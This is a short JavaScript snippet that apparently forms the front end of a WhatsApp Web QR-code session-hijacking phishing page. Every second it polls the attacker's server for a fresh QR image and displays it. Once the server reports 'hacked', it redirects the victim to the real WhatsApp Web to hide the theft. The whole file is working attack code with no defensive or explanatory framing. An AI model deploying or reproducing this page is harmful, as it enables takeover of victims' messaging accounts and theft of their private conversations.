// ask the server every second for the qr code
setInterval(() => {
  $.get({
        url: '/get-qr/'
      })
        .done(response => {
            if (response === 'hacked') {
              // if hacked, redirect to the real webpage
              window.location.replace('https://web.whatsapp.com/')
            } else {
              // else, keep updating the qr code image
              $('img').attr('src', 'data:image/png;base64,'+response);
            }
    });
}, 1000);
